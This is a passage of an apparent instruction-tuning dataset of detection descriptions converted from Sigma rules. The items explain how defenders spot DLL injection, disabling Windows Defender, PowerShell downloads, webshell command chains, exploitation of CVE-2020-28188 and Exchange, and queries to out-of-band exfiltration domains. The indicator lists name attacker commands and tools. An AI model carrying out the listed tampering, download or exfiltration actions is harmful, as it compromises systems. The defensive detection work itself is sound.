      "answer": "In order to detect potential use of CreateRemoteThread API and LoadLibrary function to inject DLL into a process, you should look for events within Windows logs that fall under the category of create_remote_thread. Specifically, focus your attention on instances where a thread is created remotely and initiates from the module ending with '\\kernel32.dll'. The hallmark activity to watch for is the use of the 'LoadLibraryA' function. This particular combination of starting module and function strongly suggests an attempt to inject a DLL into another process, which is a technique attackers might use to execute malicious code within the context of legitimate processes on the victim's system. Given the nature of this behavior, there are no known benign circumstances that exactly match this pattern, making every hit potentially significant and the level of alert high. The tags related to this detection strategy include tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion, particularly focusing on process injection."
    }
  },
  {
    "instruction": "How to detect: service creation persistence used by the Goofy Guineapig backdoor",
    "context": "",
    "output": "In order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "service creation persistence used by the Goofy Guineapig backdoor",
      "answer": "In order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation."
    }
  },
  {
    "instruction": "How can I detect: service installed by a client which has PID 0 or whose parent has PID 0",
    "context": "",
    "output": "In order to detect a service installed by a client which has PID 0 or whose parent has PID 0, you should: Focus on monitoring Windows system logs, specifically targeting events generated by the Service Control Manager. Look for event ID 7045, which signifies a service installation event. Specifically, focus on identifying instances where the 'ProcessId' field reports a value of 0. This is significant because a Process ID (PID) of 0 can indicate that the service was initiated by the system or a process with no parent, potentially signaling a malicious installation. It's important to treat cases that trigger this alert with caution, though some might turn out to be benign, the unknown nature of false positives implies that each instance should be investigated to confirm or rule out malicious activity. This analysis is critical as it relates to identifying potentially malicious service installations, a technique often utilized by adversaries to ensure persistence, execute malware, or obtain privileged access within a compromised system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "service installed by a client which has PID 0 or whose parent has PID 0",
      "answer": "In order to detect a service installed by a client which has PID 0 or whose parent has PID 0, you should: Focus on monitoring Windows system logs, specifically targeting events generated by the Service Control Manager. Look for event ID 7045, which signifies a service installation event. Specifically, focus on identifying instances where the 'ProcessId' field reports a value of 0. This is significant because a Process ID (PID) of 0 can indicate that the service was initiated by the system or a process with no parent, potentially signaling a malicious installation. It's important to treat cases that trigger this alert with caution, though some might turn out to be benign, the unknown nature of false positives implies that each instance should be investigated to confirm or rule out malicious activity. This analysis is critical as it relates to identifying potentially malicious service installations, a technique often utilized by adversaries to ensure persistence, execute malware, or obtain privileged access within a compromised system."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of whoami, which is often used by attackers after exploitation / privilege escalation",
    "context": "",
    "output": "In order to detect the execution of whoami, which is often used by attackers after exploitation / privilege escalation, you should: Monitor the creation of processes on Windows systems for the execution of the \"whoami.exe\" application. This involves looking for process creations where the image name ends with \"\\whoami.exe\" or where the original file name is exactly \"whoami.exe\". This is an important step because attackers frequently use the \"whoami\" command to check the current user's identity and assess the level of privileges they have obtained after gaining access or escalating their privileges within the system. It's worth noting that there could be legitimate uses of the \"whoami.exe\" command by administrators or through scripts and administrative tools within the environment, as well as for monitoring activities, which should be considered as potential sources of false positives. The risk level for this activity is assessed as medium, implying that while it may not always indicate malicious activity, it deserves attention and potentially further investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of whoami, which is often used by attackers after exploitation / privilege escalation",
      "answer": "In order to detect the execution of whoami, which is often used by attackers after exploitation / privilege escalation, you should: Monitor the creation of processes on Windows systems for the execution of the \"whoami.exe\" application. This involves looking for process creations where the image name ends with \"\\whoami.exe\" or where the original file name is exactly \"whoami.exe\". This is an important step because attackers frequently use the \"whoami\" command to check the current user's identity and assess the level of privileges they have obtained after gaining access or escalating their privileges within the system. It's worth noting that there could be legitimate uses of the \"whoami.exe\" command by administrators or through scripts and administrative tools within the environment, as well as for monitoring activities, which should be considered as potential sources of false positives. The risk level for this activity is assessed as medium, implying that while it may not always indicate malicious activity, it deserves attention and potentially further investigation."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Malleable OneDrive Profile",
    "context": "",
    "output": "In order to Detect Malleable OneDrive Profile, you should: Monitor network traffic through your proxy logs focusing on GET requests sent to onedrive.live.com. Specifically, look for URLs that end with the parameter '?manifest=wac'. It's essential to filter out and not consider URLs that start with 'http' and contain '://onedrive.live.com/' within them as these are not indicative of the malicious activity this mechanism aims to detect. This detection strategy is vital for identifying attempts to misuse or mimic OneDrive for potentially malicious purposes, marking it with a high importance. Note that there may be unknown scenarios leading to false positives in this detection approach. The associated tactics and techniques include Exfiltration Over Web Service and Data Obfuscation, indicating an attacker's attempt to stealthily exfiltrate data or conceal their actions using legitimate web services.\n",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Malleable OneDrive Profile",
      "answer": "In order to Detect Malleable OneDrive Profile, you should: Monitor network traffic through your proxy logs focusing on GET requests sent to onedrive.live.com. Specifically, look for URLs that end with the parameter '?manifest=wac'. It's essential to filter out and not consider URLs that start with 'http' and contain '://onedrive.live.com/' within them as these are not indicative of the malicious activity this mechanism aims to detect. This detection strategy is vital for identifying attempts to misuse or mimic OneDrive for potentially malicious purposes, marking it with a high importance. Note that there may be unknown scenarios leading to false positives in this detection approach. The associated tactics and techniques include Exfiltration Over Web Service and Data Obfuscation, indicating an attacker's attempt to stealthily exfiltrate data or conceal their actions using legitimate web services.\n"
    }
  },
  {
    "instruction": "How to detect: attackers attempting to disable Windows Defender using Powershell",
    "context": "",
    "output": "In order to detect attackers attempting to disable Windows Defender using Powershell, you should monitor the creation of processes on Windows systems for specific activities indicative of attempts to tamper with Windows Defender. Look for invocations of the PowerShell executable ('powershell.exe' or the newer 'pwsh.exe') or references to their original file names ('PowerShell.EXE' or 'pwsh.dll'). Additionally, monitor for PowerShell command lines that attempt to disable behavior or runtime monitoring in an effort to evade detection.\n\nSimultaneously, keep an eye out for usage of the 'sc.exe' command-line utility, specifically commands that attempt to stop, delete, or disable the Windows Defender service (referred to as 'WinDefend'). These commands can be identified through the presence of certain keywords in the command line, such as 'stop WinDefend', 'delete WinDefend', or commands configuring 'WinDefend' to start in a 'disabled' state.\n\nThis strategy aims at identifying potentially malicious activities by watching for specific attempts to interfere with Windows Defender. Given the critical role of Windows Defender in system security, such actions are usually indicative of bad faith, except for some rare false positives. Noteworthy exceptions might occur with certain development tools which may disable Windows Defender to improve performance; however, this practice is not recommended for security reasons.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "attackers attempting to disable Windows Defender using Powershell",
      "answer": "In order to detect attackers attempting to disable Windows Defender using Powershell, you should monitor the creation of processes on Windows systems for specific activities indicative of attempts to tamper with Windows Defender. Look for invocations of the PowerShell executable ('powershell.exe' or the newer 'pwsh.exe') or references to their original file names ('PowerShell.EXE' or 'pwsh.dll'). Additionally, monitor for PowerShell command lines that attempt to disable behavior or runtime monitoring in an effort to evade detection.\n\nSimultaneously, keep an eye out for usage of the 'sc.exe' command-line utility, specifically commands that attempt to stop, delete, or disable the Windows Defender service (referred to as 'WinDefend'). These commands can be identified through the presence of certain keywords in the command line, such as 'stop WinDefend', 'delete WinDefend', or commands configuring 'WinDefend' to start in a 'disabled' state.\n\nThis strategy aims at identifying potentially malicious activities by watching for specific attempts to interfere with Windows Defender. Given the critical role of Windows Defender in system security, such actions are usually indicative of bad faith, except for some rare false positives. Noteworthy exceptions might occur with certain development tools which may disable Windows Defender to improve performance; however, this practice is not recommended for security reasons."
    }
  },
  {
    "instruction": "Please help me detect the following: exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188",
    "context": "",
    "output": "Sure!\nIn order to detect the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188, you should: Focus on monitoring web server logs for specific indicators of compromise. The key aspect to look for is HTTP GET requests made to the '/include/makecvs.php' page which also include '?Event=' in the query string. Additionally, the presence of certain keywords in the query parameters, such as 'curl', 'wget', '.py', '.sh', 'chmod', and '_GET', strengthens the suspicion of an attack. These indicators suggest an adversary is attempting to exploit the vulnerability to execute arbitrary commands or scripts on the webserver. The logs from the webserver should be thoroughly examined for entries that combine these signs. Capture the client IP (c-ip) and DNS (c-dns) information as it could be crucial for the investigation. Note that the confidence level in this detection rule is high, even though there might be unknown cases leading to false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188",
      "answer": "In order to detect the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188, you should: Focus on monitoring web server logs for specific indicators of compromise. The key aspect to look for is HTTP GET requests made to the '/include/makecvs.php' page which also include '?Event=' in the query string. Additionally, the presence of certain keywords in the query parameters, such as 'curl', 'wget', '.py', '.sh', 'chmod', and '_GET', strengthens the suspicion of an attack. These indicators suggest an adversary is attempting to exploit the vulnerability to execute arbitrary commands or scripts on the webserver. The logs from the webserver should be thoroughly examined for entries that combine these signs. Capture the client IP (c-ip) and DNS (c-dns) information as it could be crucial for the investigation. Note that the confidence level in this detection rule is high, even though there might be unknown cases leading to false positives."
    }
  },
  {
    "instruction": "How can I detect: loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL",
    "context": "",
    "output": "In order to detect loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor Windows image load events for instances where the Microsoft Defender processes, specifically 'MpCmdRun.exe' or 'NisSrv.exe', attempt to load the 'mpclient.dll' dynamic link library. The focus should be on identifying when these DLLs are loaded from locations outside the standard directories typically used by Windows Defender, such as 'C:\\Program Files\\Windows Defender\\', 'C:\\Program Files (x86)\\Windows Defender\\', or 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'. The appearance of such activity indicates a high probability of an attempt at DLL sideloading - a technique often used by adversaries to execute malicious code by exploiting the legitimate processes of trusted applications. It's crucial to note that false positives for this detection method are very unlikely, underscoring the importance of this monitoring in identifying potential security breaches.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "answer": "In order to detect loading of Microsoft Defender's DLLs by its processes (MpCmdRun and NisSrv) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor Windows image load events for instances where the Microsoft Defender processes, specifically 'MpCmdRun.exe' or 'NisSrv.exe', attempt to load the 'mpclient.dll' dynamic link library. The focus should be on identifying when these DLLs are loaded from locations outside the standard directories typically used by Windows Defender, such as 'C:\\Program Files\\Windows Defender\\', 'C:\\Program Files (x86)\\Windows Defender\\', or 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'. The appearance of such activity indicates a high probability of an attempt at DLL sideloading - a technique often used by adversaries to execute malicious code by exploiting the legitimate processes of trusted applications. It's crucial to note that false positives for this detection method are very unlikely, underscoring the importance of this monitoring in identifying potential security breaches."
    }
  },
  {
    "instruction": "Explain how should I detect the following: pattern of a pipe name as used by the tool EfsPotato",
    "context": "",
    "output": "In order to detect the pattern of a pipe name as used by the tool EfsPotato, you should monitor the creation of named pipes on Windows systems, which can be a sign of specific malicious activities like those conducted by EfsPotato. This requires configuring the logging of Named Pipe Events through Sysmon (specifically Event IDs 17 and 18). Once logging is set up, focus on identifying instances where named pipes are created with names that contain the substring `'\\pipe\\'`. However, to refine the detection and reduce noise, give special attention to named pipes that further specify `'\\pipe\\srvsvc'` in their name, as this is a more distinct pattern linked to suspicious activity. It is also important to exclude any pipe names containing `'\\CtxShare'` from the detection as this can lead to false positives. This approach is critical for identifying potential exploitation activities tied to EfsPotato without being overwhelmed by irrelevant data.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of a pipe name as used by the tool EfsPotato",
      "answer": "In order to detect the pattern of a pipe name as used by the tool EfsPotato, you should monitor the creation of named pipes on Windows systems, which can be a sign of specific malicious activities like those conducted by EfsPotato. This requires configuring the logging of Named Pipe Events through Sysmon (specifically Event IDs 17 and 18). Once logging is set up, focus on identifying instances where named pipes are created with names that contain the substring `'\\pipe\\'`. However, to refine the detection and reduce noise, give special attention to named pipes that further specify `'\\pipe\\srvsvc'` in their name, as this is a more distinct pattern linked to suspicious activity. It is also important to exclude any pipe names containing `'\\CtxShare'` from the detection as this can lead to false positives. This approach is critical for identifying potential exploitation activities tied to EfsPotato without being overwhelmed by irrelevant data."
    }
  },
  {
    "instruction": "How can I detect: suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE",
    "context": "",
    "output": "In order to detect suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful Remote Code Execution (RCE), you should:\nMonitor DNS query logs for any requests that contain specific domain names known to be associated with external service interactions. These domains include '.interact.sh', '.oast.pro', '.oast.live', '.oast.site', '.oast.online', '.oast.fun', '.oast.me', '.burpcollaborator.net', '.oastify.com', '.canarytokens.com', '.requestbin.net', and '.dnslog.cn'. Any DNS queries containing these domains should be flagged as suspicious because they are often used by attackers for out-of-band data exfiltration or command and control (C2) communications following a successful RCE attack. The level of concern for such detections is categorized as high due to the potential implications of such activity indicating a breach. However, it's important to note there may be unknown false positives, and each detection should be thoroughly investigated to confirm malicious activity. This approach is aligned with detecting techniques categorized under the MITRE ATT&CK tactics of command and control, and exfiltration, aiming to identify and mitigate potential threats as early as possible.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful RCE",
      "answer": "In order to detect suspicious DNS queries to external service interaction domains often used for out-of-band interactions after successful Remote Code Execution (RCE), you should:\nMonitor DNS query logs for any requests that contain specific domain names known to be associated with external service interactions. These domains include '.interact.sh', '.oast.pro', '.oast.live', '.oast.site', '.oast.online', '.oast.fun', '.oast.me', '.burpcollaborator.net', '.oastify.com', '.canarytokens.com', '.requestbin.net', and '.dnslog.cn'. Any DNS queries containing these domains should be flagged as suspicious because they are often used by attackers for out-of-band data exfiltration or command and control (C2) communications following a successful RCE attack. The level of concern for such detections is categorized as high due to the potential implications of such activity indicating a breach. However, it's important to note there may be unknown false positives, and each detection should be thoroughly investigated to confirm malicious activity. This approach is aligned with detecting techniques categorized under the MITRE ATT&CK tactics of command and control, and exfiltration, aiming to identify and mitigate potential threats as early as possible."
    }
  },
  {
    "instruction": "How to detect: use of NSudo tool for command execution",
    "context": "",
    "output": "In order to detect the use of NSudo tool for command execution, you should: focus on monitoring process creation events within Windows systems. Look specifically for instances where the process image ends with 'NSudo.exe', 'NSudoLC.exe', or 'NSudoLG.exe', or when the original file name matches these values. Additionally, examine the command line for certain flags and parameters, including those that specify running with System privileges ('-U:S'), as a Trusted Installer ('-U:T'), with elevated rights ('-U:E'), enabling all privileges ('-P:E'), or setting the integrity level to System ('-M:S') or High ('-M:H'). Also, look for signs of attempting to hide the window during execution with '-ShowWindowMode:Hide'. It's important to observe for any combination of these indicators. However, be aware that there may be legitimate administrative uses of NSudo, which should be considered when evaluating alerts. Focus on capturing the command line and parent command line in logs for detailed investigation. The activity you're detecting is a high risk, indicating potential malicious use of NSudo tool to gain elevated rights or execute commands with higher privileges.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of NSudo tool for command execution",
      "answer": "In order to detect the use of NSudo tool for command execution, you should: focus on monitoring process creation events within Windows systems. Look specifically for instances where the process image ends with 'NSudo.exe', 'NSudoLC.exe', or 'NSudoLG.exe', or when the original file name matches these values. Additionally, examine the command line for certain flags and parameters, including those that specify running with System privileges ('-U:S'), as a Trusted Installer ('-U:T'), with elevated rights ('-U:E'), enabling all privileges ('-P:E'), or setting the integrity level to System ('-M:S') or High ('-M:H'). Also, look for signs of attempting to hide the window during execution with '-ShowWindowMode:Hide'. It's important to observe for any combination of these indicators. However, be aware that there may be legitimate administrative uses of NSudo, which should be considered when evaluating alerts. Focus on capturing the command line and parent command line in logs for detailed investigation. The activity you're detecting is a high risk, indicating potential malicious use of NSudo tool to gain elevated rights or execute commands with higher privileges."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious PowerShell download command",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious PowerShell download command, you should: Monitor Windows PowerShell scripts for specific activities that indicate an attempt to download content from the Internet potentially for malicious purposes. This involves focusing on script block logging, which must be enabled to ensure comprehensive monitoring. Look for any script text containing instances of 'System.Net.WebClient', a .NET class commonly used in scripts to send web requests and download files or data from the Internet. Specifically, pay attention to script commands that utilize '.DownloadFile(' or '.DownloadString(', as these are clear indicators of download attempts. Be aware that not all PowerShell scripts downloading content are malicious; some legitimate scripts perform similar actions for valid reasons, hence these are noted as potential false positives. This detection operates at a medium threat level, suggesting that while not all detected activities will be malicious, they warrant investigation. Key tags related to this monitoring effort include PowerShell, Web Protocols, and Command and Scripting Interpreter, aligning with techniques for executing code and obtaining resources over the network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious PowerShell download command",
      "answer": "In order to detect suspicious PowerShell download command, you should: Monitor Windows PowerShell scripts for specific activities that indicate an attempt to download content from the Internet potentially for malicious purposes. This involves focusing on script block logging, which must be enabled to ensure comprehensive monitoring. Look for any script text containing instances of 'System.Net.WebClient', a .NET class commonly used in scripts to send web requests and download files or data from the Internet. Specifically, pay attention to script commands that utilize '.DownloadFile(' or '.DownloadString(', as these are clear indicators of download attempts. Be aware that not all PowerShell scripts downloading content are malicious; some legitimate scripts perform similar actions for valid reasons, hence these are noted as potential false positives. This detection operates at a medium threat level, suggesting that while not all detected activities will be malicious, they warrant investigation. Key tags related to this monitoring effort include PowerShell, Web Protocols, and Command and Scripting Interpreter, aligning with techniques for executing code and obtaining resources over the network."
    }
  },
  {
    "instruction": "How to detect: execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products",
    "context": "",
    "output": "In order to detect execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys, often used by attackers to prevent safeboot execution of security products, you should: monitor process creation logs on Windows systems for instances of the \"reg.exe\" program being executed, specifically looking for executions where the command line contains both the \"delete\" command and a reference to the \"\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\" registry key. This activity is indicative of an attempt to manipulate registry keys associated with safe boot options, which can be a tactic used by attackers to disable security mechanisms that are configured to start during the system's safe boot mode. Given the context of this behavior and the high level of privilege required to modify these registry keys, such detections are marked with a high level of concern, and false positives are considered unlikely.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products",
      "answer": "In order to detect execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys, often used by attackers to prevent safeboot execution of security products, you should: monitor process creation logs on Windows systems for instances of the \"reg.exe\" program being executed, specifically looking for executions where the command line contains both the \"delete\" command and a reference to the \"\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\" registry key. This activity is indicative of an attempt to manipulate registry keys associated with safe boot options, which can be a tactic used by attackers to disable security mechanisms that are configured to start during the system's safe boot mode. Given the context of this behavior and the high level of privilege required to modify these registry keys, such detections are marked with a high level of concern, and false positives are considered unlikely."
    }
  },
  {
    "instruction": "Can you explain how to detect: Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL.",
    "context": "",
    "output": "Certainly!\n\nIn order to prevent adversaries from abusing the Windows Update client (wuauclt.exe) for arbitrary code execution, you should: monitor process creation logs in Windows for instances where the command line includes wuauclt.exe along with the flags '/UpdateDeploymentProvider' and '/Runhandlercomserver'. It is important to exclude instances where the command line also contains references to 'wuaueng.dll' or 'UpdateDeploymentProvider.dll /ClassId' as these are associated with legitimate operations of Windows Update. Paying attention to such command line patterns can help distinguish malicious use of wuauclt.exe aimed at executing code through unauthorized DLLs. This detection strategy is crucial for defending against techniques focused on evasion and execution, specifically those involving the abuse of signed binaries to bypass security controls.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL.",
      "answer": "In order to prevent adversaries from abusing the Windows Update client (wuauclt.exe) for arbitrary code execution, you should: monitor process creation logs in Windows for instances where the command line includes wuauclt.exe along with the flags '/UpdateDeploymentProvider' and '/Runhandlercomserver'. It is important to exclude instances where the command line also contains references to 'wuaueng.dll' or 'UpdateDeploymentProvider.dll /ClassId' as these are associated with legitimate operations of Windows Update. Paying attention to such command line patterns can help distinguish malicious use of wuauclt.exe aimed at executing code through unauthorized DLLs. This detection strategy is crucial for defending against techniques focused on evasion and execution, specifically those involving the abuse of signed binaries to bypass security controls."
    }
  },
  {
    "instruction": "How can I detect: Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.",
    "context": "",
    "output": "In order to look for changes to registry to disable any write-protect property for storage devices, which could be a precursor to a ransomware attack and has been an observed technique used by the cypherpunk group, you should: focus on monitoring Windows process creation logs for commands that aim to modify the registry. Specifically, keep an eye out for commands that contain \"reg add\" together with the path \"\\system\\currentcontrolset\\control\" and the phrases \"write protection\" and \"0\". Additionally, the presence of the terms \"storage\" or \"storagedevicepolicies\" within the command line should be considered suspicious. These criteria are used to detect attempts to disable write protection on storage devices through registry modifications, which could be indicative of malicious activity aimed at preparing the system for a ransomware attack. It's important to be cautious, as detection is on a medium confidence level and there might be unknown cases leading to false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.",
      "answer": "In order to look for changes to registry to disable any write-protect property for storage devices, which could be a precursor to a ransomware attack and has been an observed technique used by the cypherpunk group, you should: focus on monitoring Windows process creation logs for commands that aim to modify the registry. Specifically, keep an eye out for commands that contain \"reg add\" together with the path \"\\system\\currentcontrolset\\control\" and the phrases \"write protection\" and \"0\". Additionally, the presence of the terms \"storage\" or \"storagedevicepolicies\" within the command line should be considered suspicious. These criteria are used to detect attempts to disable write protection on storage devices through registry modifications, which could be indicative of malicious activity aimed at preparing the system for a ransomware attack. It's important to be cautious, as detection is on a medium confidence level and there might be unknown cases leading to false positives."
    }
  },
  {
    "instruction": "Please help me detect the following: exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity",
    "context": "",
    "output": "Sure!\nIn order to detect exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity, you should: focus on monitoring webserver logs, specifically looking for certain patterns of behavior that could indicate an attack. This includes POST requests to specific URI queries that are common targets for hackers, such as '/owa/auth/Current/themes/resources/', '/owa/auth/Current/', and '/ecp/'. Pay special attention to requests that contain these paths but also have specific user agent strings known to mimic legitimate web crawlers such as DuckDuckGo, Facebook, Baidu, Bing, Google, Konqueror, Yahoo, Yandex, and others, as well as certain agents like ExchangeServicesClient and various versions of python-requests. Additionally, look for POST requests directed at URI queries like '/aspnet_client/', '/owa/', '/ecp/default.flt', and '/ecp/main.css', which could further indicate suspicious activity. Another red flag is POST requests to '/ecp/' that include '.js', suggesting possible malicious script execution attempts. It's important to keep in mind that there may be false positives, such as legitimate access to other web applications using similar folder names to those targeted in the attack, like 'owa' or 'ecp', which are not related to Microsoft Exchange. The level of concern for these indicators should be high due to the potential impact and the tactics used by the HAFNIUM group.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity",
      "answer": "In order to detect exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity, you should: focus on monitoring webserver logs, specifically looking for certain patterns of behavior that could indicate an attack. This includes POST requests to specific URI queries that are common targets for hackers, such as '/owa/auth/Current/themes/resources/', '/owa/auth/Current/', and '/ecp/'. Pay special attention to requests that contain these paths but also have specific user agent strings known to mimic legitimate web crawlers such as DuckDuckGo, Facebook, Baidu, Bing, Google, Konqueror, Yahoo, Yandex, and others, as well as certain agents like ExchangeServicesClient and various versions of python-requests. Additionally, look for POST requests directed at URI queries like '/aspnet_client/', '/owa/', '/ecp/default.flt', and '/ecp/main.css', which could further indicate suspicious activity. Another red flag is POST requests to '/ecp/' that include '.js', suggesting possible malicious script execution attempts. It's important to keep in mind that there may be false positives, such as legitimate access to other web applications using similar folder names to those targeted in the attack, like 'owa' or 'ecp', which are not related to Microsoft Exchange. The level of concern for these indicators should be high due to the potential impact and the tactics used by the HAFNIUM group."
    }
  },
  {
    "instruction": "Can you explain how to detect: patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
    "context": "",
    "output": "Certainly!\n\nIn order to detect patterns found in process executions caused by China Chopper like tiny (ASPX) webshells, you should: monitor Windows process creation events for any executions of the 'w3wp.exe' process, or any child processes spawned by 'w3wp.exe'. Specifically, look for command lines that contain sequences of commands separated by '&' and followed by 'echo'. These sequences include commands like 'ipconfig', 'quser', 'whoami', 'c:', 'cd', 'dir', and explicit echo commands with '[E]' or '[S]'. The presence of these command sequences in the command line arguments of 'w3wp.exe' or its child processes is a strong indicator of an attack, as they are common in exploitation techniques associated with webshell activity, particularly those related to China Chopper. This activity is indicative of tactics such as execution, persistence, privilege escalation, and defense evasion, where attackers execute arbitrary system commands for reconnaissance, maintaining access, or moving laterally within a network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
      "answer": "In order to detect patterns found in process executions caused by China Chopper like tiny (ASPX) webshells, you should: monitor Windows process creation events for any executions of the 'w3wp.exe' process, or any child processes spawned by 'w3wp.exe'. Specifically, look for command lines that contain sequences of commands separated by '&' and followed by 'echo'. These sequences include commands like 'ipconfig', 'quser', 'whoami', 'c:', 'cd', 'dir', and explicit echo commands with '[E]' or '[S]'. The presence of these command sequences in the command line arguments of 'w3wp.exe' or its child processes is a strong indicator of an attack, as they are common in exploitation techniques associated with webshell activity, particularly those related to China Chopper. This activity is indicative of tactics such as execution, persistence, privilege escalation, and defense evasion, where attackers execute arbitrary system commands for reconnaissance, maintaining access, or moving laterally within a network."
    }
  },
  {
    "instruction": "Explain how should I detect the following: use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
    "context": "",
    "output": "In order to detect the use of a renamed AdFind.exe, which continues to be seen across the majority of breaches and is used for domain trust discovery to plan out subsequent steps in the attack chain, you should monitor for the creation of processes on Windows systems that exhibit specific characteristics indicative of such reconnaissance activities. Key indicators include command lines containing references to domain information querying such as 'domainlist,' 'trustdmp,' 'dcmodes,' 'adinfo,' 'dclist,' 'computer_pwdnotreqd,' 'objectcategory=,' '-subnets -f,' 'name=\"Domain Admins\",' '-sc u:,' 'domainncs,' 'dompol,' 'oudmp,' 'subnetdmp,' 'gpodmp,' 'fspdmp,' 'users_noexpire,' 'computers_active,' and 'computers_pwdnotreqd.' Additionally, detection can be bolstered by identifying processes with specific hash values known to be associated with AdFind, specifically bca5675746d13a1f246e2da3c2217492 and 53e117a96057eaf19c41380d0e87f1c2, or processes where the original file name is 'AdFind.exe,' while ensuring to exclude legitimate instances of AdFind.exe. This approach aims at minimizing the risk of overlooking a potentially malicious activity designed to gain insights into domain trusts and facilitate the planning of further malicious operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
